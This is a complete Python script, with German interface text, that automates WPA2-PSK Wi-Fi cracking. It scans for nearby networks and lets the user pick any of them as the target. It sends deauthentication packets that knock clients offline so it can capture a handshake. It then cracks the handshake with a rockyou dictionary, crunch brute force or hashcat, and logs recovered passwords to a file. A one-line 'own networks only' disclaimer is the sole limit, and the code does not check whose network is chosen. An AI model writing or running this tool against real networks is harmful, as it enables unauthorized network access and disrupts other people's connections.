#!/usr/bin/env python3
"""
WiFi WPA2-PSK Cracker - Home Lab Tool
Wrapper around aircrack-ng suite and hashcat for WPA2 handshake capture and cracking.
ONLY use on networks you own or have explicit permission to test.
"""

import subprocess
import sys
import os
import signal
import time
import glob
import argparse
import re
from pathlib import Path

CAPTURE_DIR = Path(__file__).parent / "captures"
DEFAULT_WORDLIST = "/usr/share/wordlists/rockyou.txt"


def check_root():
    if os.geteuid() != 0:
        print("[!] Dieses Tool muss als root ausgeführt werden.")
        print("    Starte mit: sudo python3 wifi_cracker.py")
        sys.exit(1)


def check_dependencies():
    tools = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "hashcat"]
    missing = []
    for tool in tools:
        result = subprocess.run(["which", tool], capture_output=True)
        if result.returncode != 0:
            missing.append(tool)
    if missing:
        print(f"[!] Fehlende Tools: {', '.join(missing)}")
        print("    Installiere mit: sudo apt install aircrack-ng hashcat")
        sys.exit(1)


def get_wireless_interfaces():
    """Erkennt verfügbare WLAN-Interfaces."""
    result = subprocess.run(["iwconfig"], capture_output=True, text=True, stderr=subprocess.STDOUT)
    interfaces = []
    for line in result.stdout.split("\n"):
        if "IEEE 802.11" in line:
            iface = line.split()[0]
            interfaces.append(iface)
    return interfaces


def select_interface(interfaces):
    """Lässt den Benutzer ein Interface auswählen."""
    if not interfaces:
        print("[!] Kein WLAN-Interface gefunden.")
        sys.exit(1)
    if len(interfaces) == 1:
        print(f"[*] Verwende Interface: {interfaces[0]}")
        return interfaces[0]
    print("\n[?] Verfügbare WLAN-Interfaces:")
    for i, iface in enumerate(interfaces):
        print(f"    {i + 1}) {iface}")
    while True:
        try:
            choice = int(input("\n[?] Interface auswählen (Nummer): ")) - 1
            if 0 <= choice < len(interfaces):
                return interfaces[choice]
        except (ValueError, KeyboardInterrupt):
            pass
        print("[!] Ungültige Auswahl.")


def enable_monitor_mode(interface):
    """Aktiviert Monitor-Modus auf dem Interface."""
    print(f"\n[*] Aktiviere Monitor-Modus auf {interface}...")

    # Störende Prozesse beenden
    subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)
    time.sleep(1)

    result = subprocess.run(
        ["airmon-ng", "start", interface],
        capture_output=True, text=True
    )

    # Monitor-Interface finden (meist wlan0mon oder interface + "mon")
    mon_interface = interface + "mon"
    # Prüfe ob das mon-Interface existiert
    check = subprocess.run(["iwconfig", mon_interface], capture_output=True, text=True, stderr=subprocess.STDOUT)
    if "No such device" in check.stdout:
        # Vielleicht heißt es anders
        ifaces = get_wireless_interfaces()
        mon_candidates = [i for i in ifaces if "mon" in i]
        if mon_candidates:
            mon_interface = mon_candidates[0]
        else:
            # Manchmal bleibt der Name gleich
            check2 = subprocess.run(["iwconfig", interface], capture_output=True, text=True, stderr=subprocess.STDOUT)
            if "Mode:Monitor" in check2.stdout:
                mon_interface = interface
            else:
                print("[!] Konnte Monitor-Modus nicht aktivieren.")
                print(f"    Output: {result.stdout}")
                sys.exit(1)

    print(f"[+] Monitor-Modus aktiv auf: {mon_interface}")
    return mon_interface


def disable_monitor_mode(mon_interface):
    """Deaktiviert Monitor-Modus und startet NetworkManager neu."""
    print(f"\n[*] Deaktiviere Monitor-Modus auf {mon_interface}...")
    subprocess.run(["airmon-ng", "stop", mon_interface], capture_output=True)
    subprocess.run(["systemctl", "start", "NetworkManager"], capture_output=True)
    print("[+] Monitor-Modus deaktiviert, NetworkManager neu gestartet.")


def scan_networks(mon_interface, duration=15):
    """Scannt nach WPA2-Netzwerken in der Umgebung."""
    CAPTURE_DIR.mkdir(exist_ok=True)
    scan_file = CAPTURE_DIR / "scan"

    # Alte Scan-Dateien entfernen
    for f in glob.glob(str(scan_file) + "*"):
        os.remove(f)

    print(f"\n[*] Scanne nach Netzwerken ({duration} Sekunden)...")
    print("    Drücke Ctrl+C zum vorzeitigen Beenden des Scans.\n")

    proc = subprocess.Popen(
        ["airodump-ng", "--write", str(scan_file), "--output-format", "csv", mon_interface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    try:
        proc.wait(timeout=duration)
    except subprocess.TimeoutExpired:
        proc.send_signal(signal.SIGINT)
        proc.wait()
    except KeyboardInterrupt:
        proc.send_signal(signal.SIGINT)
        proc.wait()

    time.sleep(1)

    # CSV-Datei parsen
    csv_file = str(scan_file) + "-01.csv"
    if not os.path.exists(csv_file):
        print("[!] Keine Scan-Ergebnisse gefunden.")
        return []

    networks = []
    with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
        lines = f.readlines()

    in_ap_section = False
    for line in lines:
        line = line.strip()
        if line.startswith("BSSID"):
            in_ap_section = True
            continue
        if line.startswith("Station MAC"):
            break
        if in_ap_section and line and "," in line:
            parts = [p.strip() for p in line.split(",")]
            if len(parts) >= 14:
                bssid = parts[0]
                channel = parts[3]
                encryption = parts[5]
                power = parts[8]
                essid = parts[13]

                if "WPA2" in encryption and bssid != "":
                    networks.append({
                        "bssid": bssid,
                        "channel": channel,
                        "encryption": encryption,
                        "power": power,
                        "essid": essid if essid else "<Hidden>"
                    })

    # Nach Signalstärke sortieren
    networks.sort(key=lambda x: x["power"], reverse=True)
    return networks


def display_networks(networks):
    """Zeigt gefundene Netzwerke an."""
    if not networks:
        print("[!] Keine WPA2-Netzwerke gefunden.")
        return None

    print(f"\n[+] {len(networks)} WPA2-Netzwerk(e) gefunden:\n")
    print(f"    {'Nr':<4} {'ESSID':<30} {'BSSID':<20} {'CH':<5} {'PWR':<6} {'Verschlüsselung'}")
    print(f"    {'─' * 4} {'─' * 30} {'─' * 20} {'─' * 5} {'─' * 6} {'─' * 20}")

    for i, net in enumerate(networks):
        print(
            f"    {i + 1:<4} {net['essid']:<30} {net['bssid']:<20} "
            f"{net['channel']:<5} {net['power']:<6} {net['encryption']}"
        )

    while True:
        try:
            choice = int(input("\n[?] Zielnetzwerk auswählen (Nummer): ")) - 1
            if 0 <= choice < len(networks):
                return networks[choice]
        except (ValueError, KeyboardInterrupt):
            pass
        print("[!] Ungültige Auswahl.")


def capture_handshake(mon_interface, target, timeout=120):
    """Captured einen WPA2-Handshake durch Deauthentication."""
    CAPTURE_DIR.mkdir(exist_ok=True)
    capture_prefix = CAPTURE_DIR / f"handshake_{target['essid'].replace(' ', '_')}"

    # Alte Capture-Dateien entfernen
    for f in glob.glob(str(capture_prefix) + "*"):
        os.remove(f)

    bssid = target["bssid"]
    channel = target["channel"]
    essid = target["essid"]

    print(f"\n[*] Starte Handshake-Capture für: {essid}")
    print(f"    BSSID: {bssid} | Kanal: {channel}")
    print(f"    Timeout: {timeout} Sekunden")

    # Airodump auf Zielkanal starten
    airodump = subprocess.Popen(
        [
            "airodump-ng",
            "--bssid", bssid,
            "--channel", channel,
            "--write", str(capture_prefix),
            "--output-format", "cap",
            mon_interface
        ],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    time.sleep(3)

    # Deauth-Pakete senden um Handshake zu erzwingen
    print("[*] Sende Deauthentication-Pakete...")
    for i in range(3):
        subprocess.run(
            [
                "aireplay-ng",
                "--deauth", "5",
                "-a", bssid,
                mon_interface
            ],
            capture_output=True
        )
        time.sleep(5)

    # Warten auf Handshake
    print("[*] Warte auf Handshake...")
    cap_file = str(capture_prefix) + "-01.cap"
    start_time = time.time()
    handshake_found = False

    while time.time() - start_time < timeout:
        if os.path.exists(cap_file):
            check = subprocess.run(
                ["aircrack-ng", cap_file],
                capture_output=True, text=True, timeout=10
            )
            if "1 handshake" in check.stdout.lower():
                handshake_found = True
                break

        # Weitere Deauth-Pakete alle 15 Sekunden
        elapsed = time.time() - start_time
        if int(elapsed) % 15 == 0 and int(elapsed) > 0:
            subprocess.run(
                ["aireplay-ng", "--deauth", "3", "-a", bssid, mon_interface],
                capture_output=True
            )

        time.sleep(2)

    airodump.send_signal(signal.SIGINT)
    airodump.wait()

    if handshake_found:
        print(f"[+] Handshake erfolgreich captured!")
        print(f"    Datei: {cap_file}")
        return cap_file
    else:
        print("[!] Kein Handshake innerhalb des Timeouts captured.")
        print("    Tipps: Näher am AP positionieren, oder Timeout erhöhen (--timeout)")
        return None


def crack_dictionary(cap_file, bssid, wordlist=None):
    """Crackt den Handshake mit einer Wortliste (aircrack-ng)."""
    if wordlist is None:
        wordlist = DEFAULT_WORDLIST

    # Prüfe ob rockyou.txt entpackt werden muss
    if wordlist == DEFAULT_WORDLIST and not os.path.exists(wordlist):
        gz_file = wordlist + ".gz"
        if os.path.exists(gz_file):
            print("[*] Entpacke rockyou.txt...")
            subprocess.run(["gunzip", "-k", gz_file])
        else:
            print(f"[!] Wortliste nicht gefunden: {wordlist}")
            return None

    if not os.path.exists(wordlist):
        print(f"[!] Wortliste nicht gefunden: {wordlist}")
        return None

    print(f"\n[*] Starte Dictionary-Angriff...")
    print(f"    Wortliste: {wordlist}")
    print(f"    Capture: {cap_file}")
    print(f"    BSSID: {bssid}\n")

    result = subprocess.run(
        ["aircrack-ng", "-w", wordlist, "-b", bssid, cap_file],
        capture_output=True, text=True
    )

    # Passwort aus Output extrahieren
    match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", result.stdout)
    if match:
        password = match.group(1)
        print(f"\n[+] PASSWORT GEFUNDEN: {password}")
        return password
    else:
        print("[!] Passwort nicht in der Wortliste gefunden.")
        return None


def crack_bruteforce(cap_file, bssid, charset="digits", min_len=8, max_len=8):
    """Crackt den Handshake mit Brute Force (aircrack-ng + crunch)."""
    # Prüfe ob crunch installiert ist
    crunch_check = subprocess.run(["which", "crunch"], capture_output=True)
    if crunch_check.returncode != 0:
        print("[!] 'crunch' nicht installiert. Installiere mit: sudo apt install crunch")
        return None

    charset_map = {
        "digits": "0123456789",
        "lower": "abcdefghijklmnopqrstuvwxyz",
        "upper": "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
        "alpha": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
        "alnum": "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    }

    chars = charset_map.get(charset, charset)
    total_combinations = len(chars) ** max_len

    print(f"\n[*] Starte Brute-Force-Angriff...")
    print(f"    Zeichensatz: {charset} ({len(chars)} Zeichen)")
    print(f"    Länge: {min_len}-{max_len}")
    print(f"    Kombinationen: ~{total_combinations:,}")
    print(f"    WARNUNG: Dies kann sehr lange dauern!\n")

    # crunch generiert Passwörter, aircrack-ng probiert sie
    crunch = subprocess.Popen(
        ["crunch", str(min_len), str(max_len), chars],
        stdout=subprocess.PIPE, stderr=subprocess.DEVNULL
    )

    aircrack = subprocess.Popen(
        ["aircrack-ng", "-w", "-", "-b", bssid, cap_file],
        stdin=crunch.stdout, capture_output=True, text=True
    )

    crunch.stdout.close()

    try:
        output = aircrack.communicate()[0]
    except KeyboardInterrupt:
        crunch.kill()
        aircrack.kill()
        print("\n[!] Brute-Force abgebrochen.")
        return None

    match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", output)
    if match:
        password = match.group(1)
        print(f"\n[+] PASSWORT GEFUNDEN: {password}")
        return password
    else:
        print("[!] Passwort nicht per Brute-Force gefunden.")
        return None


def cap_to_hccapx(cap_file, bssid):
    """Konvertiert .cap zu .hccapx/.hc22000 für Hashcat."""
    hc_file = cap_file.replace(".cap", ".hc22000")

    # Versuche mit hcxpcapngtool (modern)
    result = subprocess.run(
        ["which", "hcxpcapngtool"], capture_output=True
    )
    if result.returncode == 0:
        subprocess.run(
            ["hcxpcapngtool", "-o", hc_file, cap_file],
            capture_output=True
        )
        if os.path.exists(hc_file) and os.path.getsize(hc_file) > 0:
            return hc_file, 22000

    # Fallback: aircrack-ng cap2hccapx
    hccapx_file = cap_file.replace(".cap", ".hccapx")
    result = subprocess.run(
        ["which", "cap2hccapx"], capture_output=True
    )
    if result.returncode == 0:
        subprocess.run(
            ["cap2hccapx", cap_file, hccapx_file],
            capture_output=True
        )
        if os.path.exists(hccapx_file) and os.path.getsize(hccapx_file) > 0:
            return hccapx_file, 2500

    print("[!] Konnte .cap nicht konvertieren.")
    print("    Installiere hcxpcapngtool: sudo apt install hcxtools")
    return None, None


def crack_hashcat(cap_file, bssid, wordlist=None, attack_mode="dictionary"):
    """Crackt den Handshake mit Hashcat (GPU-beschleunigt)."""
    if wordlist is None:
        wordlist = DEFAULT_WORDLIST

    hc_file, hash_mode = cap_to_hccapx(cap_file, bssid)
    if hc_file is None:
        return None

    print(f"\n[*] Starte Hashcat GPU-Angriff...")
    print(f"    Hash-Datei: {hc_file}")
    print(f"    Hash-Mode: {hash_mode}")

    cmd = [
        "hashcat",
        "-m", str(hash_mode),
        hc_file,
        "--force",  # Für VMs ohne echte GPU
        "--status",
        "--status-timer", "10"
    ]

    if attack_mode == "dictionary":
        if not os.path.exists(wordlist):
            gz = wordlist + ".gz"
            if os.path.exists(gz):
                subprocess.run(["gunzip", "-k", gz])
            else:
                print(f"[!] Wortliste nicht gefunden: {wordlist}")
                return None
        cmd.extend(["-a", "0", wordlist])
        print(f"    Modus: Dictionary ({wordlist})")
    elif attack_mode == "bruteforce":
        cmd.extend(["-a", "3", "?d?d?d?d?d?d?d?d"])
        print("    Modus: Brute-Force (8-stellig, nur Ziffern)")

    print()

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
        output = result.stdout
    except subprocess.TimeoutExpired:
        print("[!] Hashcat Timeout (1 Stunde).")
        return None
    except KeyboardInterrupt:
        print("\n[!] Hashcat abgebrochen.")
        return None

    # Versuche Passwort zu lesen (hashcat --show)
    show_result = subprocess.run(
        ["hashcat", "-m", str(hash_mode), hc_file, "--show", "--force"],
        capture_output=True, text=True
    )

    if show_result.stdout.strip():
        # Format: hash:password
        parts = show_result.stdout.strip().split(":")
        password = parts[-1] if parts else None
        if password:
            print(f"\n[+] PASSWORT GEFUNDEN: {password}")
            return password

    print("[!] Passwort nicht gefunden mit Hashcat.")
    return None


def interactive_mode():
    """Interaktiver Modus - führt durch den gesamten Prozess."""
    print("""
╔══════════════════════════════════════════════╗
║         WiFi WPA2-PSK Cracker               ║
║         Home Lab Security Tool              ║
╚══════════════════════════════════════════════╝

⚠  NUR auf eigenen Netzwerken verwenden!
""")

    check_root()
    check_dependencies()

    # Interface auswählen
    interfaces = get_wireless_interfaces()
    interface = select_interface(interfaces)

    # Monitor-Modus aktivieren
    mon_interface = enable_monitor_mode(interface)

    try:
        # Netzwerke scannen
        networks = scan_networks(mon_interface)
        target = display_networks(networks)

        if target is None:
            return

        # Handshake capturen
        cap_file = capture_handshake(mon_interface, target)

        if cap_file is None:
            return

        # Crack-Methode auswählen
        print("\n[?] Crack-Methode auswählen:")
        print("    1) Dictionary-Angriff (rockyou.txt)")
        print("    2) Brute-Force (crunch)")
        print("    3) Hashcat GPU-Angriff")
        print("    4) Alle nacheinander probieren")

        method = input("\n[?] Auswahl (1-4): ").strip()

        bssid = target["bssid"]
        password = None

        if method == "1":
            password = crack_dictionary(cap_file, bssid)
        elif method == "2":
            print("\n[?] Zeichensatz:")
            print("    1) Nur Ziffern (digits)")
            print("    2) Kleinbuchstaben (lower)")
            print("    3) Alphanumerisch (alnum)")
            cs = input("[?] Auswahl (1-3): ").strip()
            cs_map = {"1": "digits", "2": "lower", "3": "alnum"}
            charset = cs_map.get(cs, "digits")

            length = input("[?] Passwort-Länge (Standard: 8): ").strip()
            length = int(length) if length.isdigit() else 8

            password = crack_bruteforce(cap_file, bssid, charset=charset, min_len=length, max_len=length)
        elif method == "3":
            print("\n[?] Hashcat-Modus:")
            print("    1) Dictionary (rockyou.txt)")
            print("    2) Brute-Force (8 Ziffern)")
            hm = input("[?] Auswahl (1-2): ").strip()
            hc_mode = "dictionary" if hm == "1" else "bruteforce"
            password = crack_hashcat(cap_file, bssid, attack_mode=hc_mode)
        elif method == "4":
            print("\n[*] Probiere alle Methoden nacheinander...\n")
            password = crack_dictionary(cap_file, bssid)
            if not password:
                password = crack_hashcat(cap_file, bssid, attack_mode="dictionary")
            if not password:
                password = crack_bruteforce(cap_file, bssid, charset="digits")

        if password:
            # Ergebnis speichern
            result_file = CAPTURE_DIR / "cracked_passwords.txt"
            with open(result_file, "a") as f:
                f.write(f"{target['essid']} | {bssid} | {password}\n")
            print(f"\n[+] Ergebnis gespeichert in: {result_file}")
        else:
            print("\n[!] Passwort konnte nicht geknackt werden.")
            print("    Versuche eine größere Wortliste oder andere Parameter.")

    finally:
        disable_monitor_mode(mon_interface)


def main():
    parser = argparse.ArgumentParser(
        description="WiFi WPA2-PSK Cracker - Home Lab Security Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Beispiele:
  sudo python3 wifi_cracker.py                         # Interaktiver Modus
  sudo python3 wifi_cracker.py crack -f handshake.cap -b AA:BB:CC:DD:EE:FF
  sudo python3 wifi_cracker.py crack -f handshake.cap -b AA:BB:CC:DD:EE:FF -m hashcat
  sudo python3 wifi_cracker.py crack -f handshake.cap -b AA:BB:CC:DD:EE:FF -m bruteforce --charset digits --length 8
        """
    )

    subparsers = parser.add_subparsers(dest="command")

    # Crack-Subcommand für vorhandene Capture-Dateien
    crack_parser = subparsers.add_parser("crack", help="Vorhandenen Handshake cracken")
    crack_parser.add_argument("-f", "--file", required=True, help="Pfad zur .cap Capture-Datei")
    crack_parser.add_argument("-b", "--bssid", required=True, help="BSSID des Zielnetzwerks")
    crack_parser.add_argument("-m", "--method", choices=["dictionary", "bruteforce", "hashcat"],
                              default="dictionary", help="Crack-Methode (Standard: dictionary)")
    crack_parser.add_argument("-w", "--wordlist", default=DEFAULT_WORDLIST, help="Pfad zur Wortliste")
    crack_parser.add_argument("--charset", default="digits",
                              help="Zeichensatz für Brute-Force: digits, lower, upper, alpha, alnum")
    crack_parser.add_argument("--length", type=int, default=8, help="Passwort-Länge für Brute-Force")

    args = parser.parse_args()

    if args.command == "crack":
        check_root()
        check_dependencies()

        if not os.path.exists(args.file):
            print(f"[!] Datei nicht gefunden: {args.file}")
            sys.exit(1)

        if args.method == "dictionary":
            crack_dictionary(args.file, args.bssid, wordlist=args.wordlist)
        elif args.method == "bruteforce":
            crack_bruteforce(args.file, args.bssid, charset=args.charset,
                             min_len=args.length, max_len=args.length)
        elif args.method == "hashcat":
            crack_hashcat(args.file, args.bssid, wordlist=args.wordlist)
    else:
        interactive_mode()


if __name__ == "__main__":
    main()
